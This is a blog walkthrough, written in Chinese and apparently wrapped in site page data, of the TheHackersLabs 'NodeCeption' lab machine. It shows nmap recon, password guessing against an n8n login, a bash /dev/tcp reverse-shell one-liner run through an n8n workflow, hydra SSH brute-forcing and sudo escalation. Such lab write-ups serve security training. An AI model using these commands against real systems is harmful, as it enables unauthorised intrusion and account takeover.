{"pageProps":{"postData":{"id":"TheHackersLabsNodeCeption","contentHtml":"<h1>NodeCeption</h1>\n<blockquote>\n<p><a href=\"https://labs.thehackerslabs.com/machine/118\">https://labs.thehackerslabs.com/machine/118</a></p>\n</blockquote>\n<p><img src=\"/post-images/TheHackersLabsNodeCeption/image.png\" alt=\"image.png\"></p>\n<h2>Recon</h2>\n<h3>PortScan</h3>\n<pre><code class=\"hljs language-bash\">➜  NodeCeption nmap -sn 192.168.56.0/24\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-25 20:09 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.1\nHost is up (0.00034s latency).\nMAC Address: 0A:00:27:00:00:09 (Unknown)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.2\nHost is up (0.00028s latency).\nMAC Address: 08:00:27:BE:8A:D9 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.88\nHost is up (0.00058s latency).\nMAC Address: 08:00:27:B3:A3:BC (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.5\nHost is up.\nNmap <span class=\"hljs-keyword\">done</span>: 256 IP addresses (4 hosts up) scanned <span class=\"hljs-keyword\">in</span> 2.09 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  NodeCeption nmap -sT -min-rate 10000 -p- 192.168.56.88\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-25 20:11 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.88\nHost is up (0.00070s latency).\nNot shown: 65532 closed tcp ports (conn-refused)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n5678/tcp open  rrac\n8765/tcp open  ultraseek-http\nMAC Address: 08:00:27:B3:A3:BC (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 3.73 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  NodeCeption nmap -sT -A -p 22,5678,8765 192.168.56.88\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-25 20:12 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.88\nHost is up (0.00053s latency).\n\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   256 67:<span class=\"hljs-built_in\">df</span>:2b:e6:48:16:ec:91:b1:a6:67:25:37:05:<span class=\"hljs-built_in\">fc</span>:0f (ECDSA)\n|_  256 dc:ab:74:b7:be:b5:49:6a:c8:7b:db:6b:7c:91:73:69 (ED25519)\n5678/tcp open  rrac?\n| fingerprint-strings:\n|   GetRequest:\n|     HTTP/1.1 200 OK\n|     Accept-Ranges: bytes\n|     Cache-Control: public, max-age=86400\n|     Last-Modified: Fri, 25 Jul 2025 12:09:30 GMT\n|     ETag: W/<span class=\"hljs-string\">\"7b7-198417d0a9c\"</span>\n|     Content-Type: text/html; charset=utf-8\n|     Content-Length: 1975\n|     Vary: Accept-Encoding\n|     Date: Fri, 25 Jul 2025 12:12:38 GMT\n|     Connection: close\n|     &#x3C;!DOCTYPE html>\n|     &#x3C;html lang=<span class=\"hljs-string\">\"en\"</span>>\n|     &#x3C;<span class=\"hljs-built_in\">head</span>>\n|     &#x3C;script <span class=\"hljs-built_in\">type</span>=<span class=\"hljs-string\">\"module\"</span> crossorigin src=<span class=\"hljs-string\">\"/assets/polyfills-B8p9DdqU.js\"</span>>&#x3C;/script>\n...\n8765/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))\n|_http-server-header: Apache/2.4.58 (Ubuntu)\n|_http-title: Apache2 Ubuntu Default Page: It works\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port5678-TCP:V=7.95%I=7%D=7/25%Time=688374B9%P=x86_64-pc-linux-gnu%r(Ge\nSF:tRequest,8DC,<span class=\"hljs-string\">\"HTTP/1\\.1\\x20200\\x20OK\\r\\nAccept-Ranges:\\x20bytes\\r\\nCach\nSF:e-Control:\\x20public,\\x20max-age=86400\\r\\nLast-Modified:\\x20Fri,\\x2025\\\nSF:x20Jul\\x202025\\x2012:09:30\\x20GMT\\r\\nETag:\\x20W/\\\"7b7-198417d0a9c\\\"\\r\\n\nSF:Content-Type:\\x20text/html;\\x20charset=utf-8\\r\\nContent-Length:\\x201975\nSF:\\r\\nVary:\\x20Accept-Encoding\\r\\nDate:\\x20Fri,\\x2025\\x20Jul\\x202025\\x201\nSF:2:12:38\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\n&#x3C;!DOCTYPE\\x20html>\\n&#x3C;html\nSF:\\x20lang=\\\"en\\\">\\n\\t&#x3C;head>\\n\\t\\t&#x3C;script\\x20type=\\\"module\\\"\\x20crossorig\nSF:in\\x20src=\\\"/assets/polyfills-B8p9DdqU\\.js\\\">&#x3C;/script>\\n\\n\\t\\t&#x3C;meta\\x20\nSF:charset=\\\"utf-8\\\"\\x20/>\\n\\t\\t&#x3C;meta\\x20http-equiv=\\\"X-UA-Compatible\\\"\\x2\nSF:0content=\\\"IE=edge\\\"\\x20/>\\n\\t\\t&#x3C;meta\\x20name=\\\"viewport\\\"\\x20content=\\\nSF:\"</span>width=device-width,initial-scale=1\\.0\\\"\\x20/>\\n\\t\\t&#x3C;<span class=\"hljs-built_in\">link</span>\\x20rel=\\\"icon\n</code></pre>\n<h3>枚举测试</h3>\n<p><code>8765</code> <code>Apache</code>默认页面</p>\n<p><img src=\"/post-images/TheHackersLabsNodeCeption/image1.png\" alt=\"image.png\"></p>\n<p><code>5678</code> <code>n8n</code></p>\n<p><img src=\"/post-images/TheHackersLabsNodeCeption/image2.png\" alt=\"image.png\"></p>\n<p><code>n8n</code> 可以反弹 <code>shell</code>，但是要进入后台，并且需要邮箱和密码</p>\n<h2>密码爆破</h2>\n<p>我么寻找一下哪里能找到信息</p>\n<p><code>8765</code> 源码中得到信息</p>\n<p><img src=\"/post-images/TheHackersLabsNodeCeption/image3.png\" alt=\"image.png\"></p>\n<blockquote>\n<p><a href=\"mailto:usuario@maildelctf.com\">usuario@maildelctf.com</a>\n希望您已按照说明更改密码。\n请记住：密码至少 8 个字符，至少包含 1 个数字和 1 个大写字母。</p>\n</blockquote>\n<p>得到一个邮箱和密码策略</p>\n<p>通过AI 写出正则表达式，然后匹配 <code>rockyou</code> 前 <code>5000</code> 的字典</p>\n<pre><code class=\"hljs language-bash\">➜  NodeCeption <span class=\"hljs-built_in\">head</span> -n 5000 /usr/share/wordlists/rockyou.txt | grep -P <span class=\"hljs-string\">'^(?=.*\\d)(?=.*[A-Z]).{8,}$'</span>                                                                          \nPassword1\nPASSWORD1\n</code></pre>\n<p>使用 <code>usuario@maildelctf.com</code>:<code>Password1</code> 可以登录进去</p>\n<p><img src=\"/post-images/TheHackersLabsNodeCeption/image4.png\" alt=\"image.png\"></p>\n<h2>n8n 后台利用</h2>\n<p>通过工作流运行命令</p>\n<p><img src=\"/post-images/TheHackersLabsNodeCeption/image5.png\" alt=\"image.png\"></p>\n<p>测试一下</p>\n<p><img src=\"/post-images/TheHackersLabsNodeCeption/image6.png\" alt=\"image.png\"></p>\n<p>成功访问</p>\n<p><img src=\"/post-images/TheHackersLabsNodeCeption/image7.png\" alt=\"image.png\"></p>\n<p>反弹 <code>shell</code> ，这里没法用<code>nc</code> 弹</p>\n<pre><code class=\"hljs language-bash\">/bin/bash -c <span class=\"hljs-string\">'bash -i >&#x26; /dev/tcp/192.168.56.5/1234 0>&#x26;1'</span>\n</code></pre>\n<p><img src=\"/post-images/TheHackersLabsNodeCeption/image8.png\" alt=\"image.png\"></p>\n<p>拿到立足点</p>\n<pre><code class=\"hljs language-bash\">➜  NodeCeption nc -lvp 1234\nlistening on [any] 1234 ...\n192.168.56.88: inverse host lookup failed: Unknown host\nconnect to [192.168.56.5] from (UNKNOWN) [192.168.56.88] 48536\nbash: cannot <span class=\"hljs-built_in\">set</span> terminal process group (2231): Inappropriate ioctl <span class=\"hljs-keyword\">for</span> device\nbash: no job control <span class=\"hljs-keyword\">in</span> this shell\nthl@nodeception:~$ \n</code></pre>\n<p>当前目录中可以拿到 <code>user.txt</code></p>\n<pre><code class=\"hljs language-bash\">thl@nodeception:~$ <span class=\"hljs-built_in\">cat</span> user.txt \nTHL_wxxxxxxxxxxxxxxxxxxx\n</code></pre>\n<h2>权限提升</h2>\n<p>一看用户组</p>\n<pre><code class=\"hljs language-bash\">thl@nodeception:~$ <span class=\"hljs-built_in\">id</span>\nuid=1000(thl) gid=1000(thl) <span class=\"hljs-built_in\">groups</span>=1000(thl),4(adm),24(cdrom),27(<span class=\"hljs-built_in\">sudo</span>),30(dip),46(plugdev),101(lxd)\n</code></pre>\n<p>再看 <code>sudo</code> 权限</p>\n<pre><code class=\"hljs language-bash\">thl@nodeception:~$ <span class=\"hljs-built_in\">sudo</span> -l\nMatching Defaults entries <span class=\"hljs-keyword\">for</span> thl on nodeception:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\n\nUser thl may run the following commands on nodeception:\n    (ALL) NOPASSWD: /usr/bin/vi\n    (ALL : ALL) ALL\n</code></pre>\n<p>但是执行时需要我们提供密码</p>\n<p>尝试<code>hydra</code>爆破</p>\n<pre><code class=\"hljs language-bash\">➜  NodeCeption hydra -l thl -P /usr/share/wordlists/rockyou.txt -t 8 192.168.56.88 ssh\nHydra v9.5 (c) 2023 by van Hauser/THC &#x26; David Maciejak - Please <span class=\"hljs-keyword\">do</span> not use <span class=\"hljs-keyword\">in</span> military or secret service organizations, or <span class=\"hljs-keyword\">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-25 20:54:04\n[DATA] max 8 tasks per 1 server, overall 8 tasks, 14344399 login tries (l:1/p:14344399), ~1793050 tries per task\n[DATA] attacking ssh://192.168.56.88:22/\n[22][ssh] host: 192.168.56.88   login: thl   password: basketball\n1 of 1 target successfully completed, 1 valid password found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-07-25 20:54:27\n</code></pre>\n<p>得到密码 <code>basketball</code></p>\n<p>结束</p>\n<pre><code class=\"hljs language-bash\">thl@nodeception:~$ <span class=\"hljs-built_in\">sudo</span> <span class=\"hljs-built_in\">cat</span> /root/root.txt\n[<span class=\"hljs-built_in\">sudo</span>] password <span class=\"hljs-keyword\">for</span> thl: \nTHL_xxxxxxxxxxxxxxxxxxx\n</code></pre>\n<h2>总结</h2>\n<p>梭哈</p>","title":"TheHackersLabs - NodeCeption","date":"2025-07-25","updated":"2025-07-25","tags":["TheHackersLabs","Linux","n8n","hydra"],"categories":"靶机","comments":true,"description":"NodeCeption\n\n https://labs.thehackerslabs.com/machine/118\n \n\n\n\nRecon\n\nPortScan\n\n\n\n\n\n\n\n枚举测试\n\n`8765` `Apache`默认页面\n\n\n\n`5678` `n8n`\n\n\n\n`n8n` 可以反弹 `shell`，但是要进入后台，并且需要邮箱和密码\n\n密码爆破\n\n我么寻找一下哪里能找到信息\n\n`8765` 源码中..."},"recentPosts":[{"id":"TheHackersLabsBack To The Future I","title":"TheHackersLabs - Back To The Future I","date":"2025-07-26","isEncrypted":false,"year":"2025","month":"07","day":"26"},{"id":"TheHackersLabsNodeCeption","title":"TheHackersLabs - NodeCeption","date":"2025-07-25","isEncrypted":false,"year":"2025","month":"07","day":"25"},{"id":"TheHackersLabsPildoritas","title":"TheHackersLabs - Pildoritas","date":"2025-07-24","isEncrypted":false,"year":"2025","month":"07","day":"24"},{"id":"TheHackersLabsMentallity","title":"TheHackersLabs - Mentallity","date":"2025-07-23","isEncrypted":false,"year":"2025","month":"07","day":"23"},{"id":"HackTheBoxSeason8 - Mirage","title":"HackTheBox - Season8 - Mirage","date":"2025-07-22","isEncrypted":true,"year":"2025","month":"07","day":"22"},{"id":"TheHackersLabsCuriosity2","title":"TheHackersLabs - Curiosity2","date":"2025-07-19","isEncrypted":false,"year":"2025","month":"07","day":"19"},{"id":"TheHackersLabsCuriosity","title":"TheHackersLabs - Curiosity","date":"2025-07-19","isEncrypted":false,"year":"2025","month":"07","day":"19"}]},"__N_SSG":true}